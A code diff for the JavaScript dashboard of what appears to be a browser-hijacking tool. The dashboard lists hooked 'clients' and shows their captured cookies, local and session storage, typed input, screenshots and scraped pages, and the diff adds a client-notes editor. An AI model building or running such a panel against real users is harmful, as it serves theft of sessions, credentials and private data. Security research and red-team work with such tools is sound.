@@ -128,7 +128,7 @@ function showHtmlCode()
 	modalContent.innerHTML = cleanCode;
 
 	var modal = new bootstrap.Modal(document.getElementById('codeModal'));
-  modal.show();
+	modal.show();
 }
 
 
@@ -140,14 +140,42 @@ function downloadHtmlCode(fileName)
 
 
 
-function showNoteEditor(client, notes)
+function showNoteEditor(client, nickname, notes)
 {
-	var modal = new bootstrap.Modal(document.getElementById("noteEditorModal"));
+	var modal      = new bootstrap.Modal(document.getElementById("noteEditorModal"));
 	var noteTitle  = document.getElementById('note-editor-title');
 	var noteEditor = document.getElementById('note-editor');
+	var saveButton = document.getElementById('note-save-button');
 
-	noteTitle.innerHTML = '<u>' + client + '</u> notes:';
-	noteEditor.value = notes;
+
+	// Handle saving modified notes
+	saveButton.onclick = function(event) {
+		console.log("Saving note for: " + client);
+		var newNotes = noteEditor.value;
+
+		console.log("New notes value:");
+		console.log(newNotes);
+
+		encodedNotes = btoa(newNotes);
+
+		// Send notes to server
+		fetch('/api/updateClientNotes/' + client, {
+			method:"POST",
+			body: JSON.stringify({
+				note: encodedNotes
+			}),
+			headers: {
+				"Content-type": "application/json; charset=UTF-8"
+			}
+		});
+
+		modal.hide();
+		updateClients();
+	};
+
+
+	noteTitle.innerHTML = '<u>' + nickname + '</u> notes:';
+	noteEditor.value = atob(notes);
 	modal.show();
 }
 
@@ -186,7 +214,7 @@ async function getClientDetails(id)
 	{
 		event = jsonResponse[i];
 		var eventKey = event.eventID;
-	
+
 		var card = document.createElement('div');
 		card.className ='card';
 
@@ -207,104 +235,104 @@ async function getClientDetails(id)
     	animation: true, // Optional: Enable tooltip animation
       delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
       container: cardSubtitle // Optional: Specify a container for the tooltip
-		};
-		new bootstrap.Tooltip(cardSubtitle, tooltipOptions);
+    };
+    new bootstrap.Tooltip(cardSubtitle, tooltipOptions);
 
 
-		var cardText = document.createElement('p');
-		cardText.className = 'card-text';
+    var cardText = document.createElement('p');
+    cardText.className = 'card-text';
 
 
 
 		// Handle event specific details and formatting
-		switch(event.eventType)
-		{
-		case 'COOKIE':
-			cookieReq  = await fetch('/api/clientCookie/' + eventKey);
-			cookieJson = await cookieReq.json();
+    switch(event.eventType)
+    {
+    case 'COOKIE':
+    	cookieReq  = await fetch('/api/clientCookie/' + eventKey);
+    	cookieJson = await cookieReq.json();
 
-			cardTitle.innerHTML = "Cookie";
-			cardText.innerHTML  = "Cookie Name: <b>" + cookieJson.cookieName + "</b>";
-			cardText.innerHTML += "<br>";
-			cardText.innerHTML += "Cookie Value: <b>" + cookieJson.cookieValue + "</b>";
-			break;
+    	cardTitle.innerHTML = "Cookie";
+    	cardText.innerHTML  = "Cookie Name: <b>" + cookieJson.cookieName + "</b>";
+    	cardText.innerHTML += "<br>";
+    	cardText.innerHTML += "Cookie Value: <b>" + cookieJson.cookieValue + "</b>";
+    	break;
 
-		case 'LOCALSTORAGE':
-			localStorageReq  = await fetch('/api/clientLocalStorage/' + eventKey);
-			localStorageJson = await localStorageReq.json();
+    case 'LOCALSTORAGE':
+    	localStorageReq  = await fetch('/api/clientLocalStorage/' + eventKey);
+    	localStorageJson = await localStorageReq.json();
 
 			// console.log("*** Local storage api call received: ");
 			// console.log(JSON.stringify(localStorageJson));
 
-			cardTitle.innerHTML = "Local Storage";
-			cardText.innerHTML  = "Key: <b>" + localStorageJson.localStorageKey + "</b>";
-			cardText.innerHTML += "<br>";
-			cardText.innerHTML += "Value: <b>" + localStorageJson.localStorageValue + "</b>";
-			break;
+    	cardTitle.innerHTML = "Local Storage";
+    	cardText.innerHTML  = "Key: <b>" + localStorageJson.localStorageKey + "</b>";
+    	cardText.innerHTML += "<br>";
+    	cardText.innerHTML += "Value: <b>" + localStorageJson.localStorageValue + "</b>";
+    	break;
 
-		case 'SESSIONSTORAGE':
-			sessionStorageReq  = await fetch('/api/clientSessionStorage/' + eventKey);
-			sessiontorageJson  = await sessionStorageReq.json();
+    case 'SESSIONSTORAGE':
+    	sessionStorageReq  = await fetch('/api/clientSessionStorage/' + eventKey);
+    	sessiontorageJson  = await sessionStorageReq.json();
 
-			cardTitle.innerHTML = "Session Storage";
-			cardText.innerHTML  = "Key: <b>" + sessiontorageJson.sessionStorageKey + "</b>";
-			cardText.innerHTML += "<br>";
-			cardText.innerHTML += "Value: <b>" + sessiontorageJson.sessionStorageValue + "</b>";
-			break;
+    	cardTitle.innerHTML = "Session Storage";
+    	cardText.innerHTML  = "Key: <b>" + sessiontorageJson.sessionStorageKey + "</b>";
+    	cardText.innerHTML += "<br>";
+    	cardText.innerHTML += "Value: <b>" + sessiontorageJson.sessionStorageValue + "</b>";
+    	break;
 
-		case 'URLVISITED':
-			urlVisitedReq  = await fetch('/api/clientUrl/' + eventKey);
-			urlVisitedJson = await urlVisitedReq.json();
+    case 'URLVISITED':
+    	urlVisitedReq  = await fetch('/api/clientUrl/' + eventKey);
+    	urlVisitedJson = await urlVisitedReq.json();
 
-			cardTitle.innerHTML = "<b>URL Visited</b>";
-			cardText.innerHTML  = "URL: <b>" + urlVisitedJson.url + "</b>";
-			break;
+    	cardTitle.innerHTML = "<b>URL Visited</b>";
+    	cardText.innerHTML  = "URL: <b>" + urlVisitedJson.url + "</b>";
+    	break;
 
-		case 'HTML':
-			htmlScrapeReq  = await fetch('/api/clientHtml/' + eventKey);
-			htmlScrapeJson = await htmlScrapeReq.json();
+    case 'HTML':
+    	htmlScrapeReq  = await fetch('/api/clientHtml/' + eventKey);
+    	htmlScrapeJson = await htmlScrapeReq.json();
 
 			// Dump it in a variable. So many issues trying to pass this code in generated HTML lol
-			scrapedHtmlCode = htmlScrapeJson.code;
+    	scrapedHtmlCode = htmlScrapeJson.code;
 
-			cardTitle.innerHTML = "HTML Scraped";
-			cardText.innerHTML  = "URL: <b>" + htmlScrapeJson.url + "</b><br><br>";
-			cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick="showHtmlCode()">View Code</button>';
-			cardText.innerHTML += '&nbsp;<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + htmlScrapeJson.fileName + `'`+ ')>Download Code</button>';
-			break;
+    	cardTitle.innerHTML = "HTML Scraped";
+    	cardText.innerHTML  = "URL: <b>" + htmlScrapeJson.url + "</b><br><br>";
+    	cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick="showHtmlCode()">View Code</button>';
+    	cardText.innerHTML += '&nbsp;<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + htmlScrapeJson.fileName + `'`+ ')>Download Code</button>';
+    	break;
 
-		case 'SCREENSHOT':
-			screenshotReq  = await fetch('/api/clientScreenshot/' + eventKey);
-			screenshotJson = await screenshotReq.json();
+    case 'SCREENSHOT':
+    	screenshotReq  = await fetch('/api/clientScreenshot/' + eventKey);
+    	screenshotJson = await screenshotReq.json();
 
-			cardTitle.innerHTML = "Screenshot Captured";
-			cardText.innerHTML  = '<a href="'  + screenshotJson.fileName + '" target="_blank"><img src="' + screenshotJson.fileName + '" class="img-thumbnail"></a>';
-			break;
+    	cardTitle.innerHTML = "Screenshot Captured";
+    	cardText.innerHTML  = '<a href="'  + screenshotJson.fileName + '" target="_blank"><img src="' + screenshotJson.fileName + '" class="img-thumbnail"></a>';
+    	break;
 
-		case 'USERINPUT':
-			userInputReq  = await fetch('/api/clientUserInput/' + eventKey);
-			userInputJson = await userInputReq.json();
+    case 'USERINPUT':
+    	userInputReq  = await fetch('/api/clientUserInput/' + eventKey);
+    	userInputJson = await userInputReq.json();
 
-			cardTitle.innerHTML = "User Input";
-			cardText.innerHTML  = "Input Name: <b>" + userInputJson.inputName + "</b>";
-			cardText.innerHTML += "<br>";
-			cardText.innerHTML += "Typed Value: <b>" + userInputJson.inputValue + "</b>";
-			break;
+    	cardTitle.innerHTML = "User Input";
+    	cardText.innerHTML  = "Input Name: <b>" + userInputJson.inputName + "</b>";
+    	cardText.innerHTML += "<br>";
+    	cardText.innerHTML += "Typed Value: <b>" + userInputJson.inputValue + "</b>";
+    	break;
 
-		default:
-			alert('!!!!Switch default-No good');
-		}
+    default:
+    	alert('!!!!Switch default-No good');
+    }
 
-		cardSubtitle.innerHTML = humanized_time_span(event.timeStamp);
+    cardSubtitle.innerHTML = humanized_time_span(event.timeStamp);
 
-		cardBody.appendChild(cardTitle);
-		cardBody.appendChild(cardSubtitle);
-		cardBody.appendChild(cardText);
+    cardBody.appendChild(cardTitle);
+    cardBody.appendChild(cardSubtitle);
+    cardBody.appendChild(cardText);
 
-		card.appendChild(cardBody);
+    card.appendChild(cardBody);
 
-		cardStack.appendChild(card);
-	}
+    cardStack.appendChild(card);
+  }
 }
 
 
@@ -342,7 +370,7 @@ async function updateClients()
 	var cardStack = document.getElementById('client-stack');
 
 	// First clear out our existing cards
-		while (cardStack.firstChild)
+	while (cardStack.firstChild)
 	{
 		cardStack.firstChild.remove();
 	}
@@ -364,7 +392,7 @@ async function updateClients()
 		// console.log("Selected ID: " + selectedClientId + ", current client id: " + client.id);
 		if (client.id == selectedClientId)
 		{
-				card.classList.add("table-active");
+			card.classList.add("table-active");
 		}
 
 
@@ -379,57 +407,59 @@ async function updateClients()
 		// Add tooltip
 		cardSubtitle.className = "card-subtitle mb-2 text-muted";
 		cardSubtitle.setAttribute("data-toggle", "tooltip")
-		cardSubtitle.setAttribute("title", "Last Seen: " + client.lastSeen);
+		cardSubtitle.setAttribute("title", "Last Update: " + client.lastSeen);
 		cardSubtitle.setAttribute("data-placement", "left");
 		const tooltipOptions = {
     	animation: true, // Optional: Enable tooltip animation
       delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
       container: cardSubtitle // Optional: Specify a container for the tooltip
-		};
-		new bootstrap.Tooltip(cardSubtitle, tooltipOptions);
+    };
+    new bootstrap.Tooltip(cardSubtitle, tooltipOptions);
 
 
-		var cardText = document.createElement('p');
-		cardText.className = 'card-text';
+    var cardText = document.createElement('p');
+    cardText.className = 'card-text';
 
-		cardTitle.innerHTML = "<u>" + client.nickname + "</u>";
+    cardTitle.innerHTML = "<u>" + client.nickname + "</u>";
 
 
 
-		cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + client.ip + "</b><br>";
+    cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + client.ip + "</b><br>";
 		//What to do about client notes?
-		if (client.notes.length > 0)
-		{
-			cardText.innerHTML += '<button type="button" class="btn btn-primary" style="float: right;" onclick=showNoteEditor(' + `'` + client.nickname + `','` + client.notes + `'`+ ')>Edit Notes</button>';
-		}
-		else
-		{
-			cardText.innerHTML += '<button type="button" class="btn btn-primary" style="float: right;" onclick=showNoteEditor(' + `'` + client.nickname + `','` + client.notes + `'`+ ')>Add Notes</button>';
-		}
+    if (client.notes.length > 0)
+    {
+    	cardText.innerHTML += '<button type="button" class="btn btn-primary" style="float: right;" onclick=showNoteEditor(' + `'` 
+    	+ client.id + `','` + client.nickname  + `','` + client.notes + `'`+ ')>Edit Notes</button>';
+    }
+    else
+    {
+    	cardText.innerHTML += '<button type="button" class="btn btn-primary" style="float: right;" onclick=showNoteEditor(' + `'` 
+    	+ client.id + `','` + client.nickname  + `','` + client.notes + `'`+ ')>Add Notes</button>';
+    }
 
-		cardText.innerHTML += "Platform:<b>&nbsp;&nbsp;&nbsp;" + client.platform + "</b><br>";
-		cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + client.browser + "</b>";
+    cardText.innerHTML += "Platform:<b>&nbsp;&nbsp;&nbsp;" + client.platform + "</b><br>";
+    cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + client.browser + "</b>";
 
-		cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
-		cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";
+    cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
+    cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";
 
 
-		cardBody.appendChild(cardTitle);
-		cardBody.appendChild(cardSubtitle);
-		cardBody.appendChild(cardText);
+    cardBody.appendChild(cardTitle);
+    cardBody.appendChild(cardSubtitle);
+    cardBody.appendChild(cardText);
 
-		card.appendChild(cardBody);
+    card.appendChild(cardBody);
 
-		card.onclick =  function(event) {
-			unselectAllClients();
-			clickedClient = this.getAttribute("clientIndex");
-			this.classList.add("table-active");
-			selectedClientId = clickedClient;
-			getClientDetails(selectedClientId);
-		};
+    card.onclick =  function(event) {
+    	unselectAllClients();
+    	clickedClient = this.getAttribute("clientIndex");
+    	this.classList.add("table-active");
+    	selectedClientId = clickedClient;
+    	getClientDetails(selectedClientId);
+    };
 
-		cardStack.appendChild(card);
-	}
+    cardStack.appendChild(card);
+  }
 }
 
 
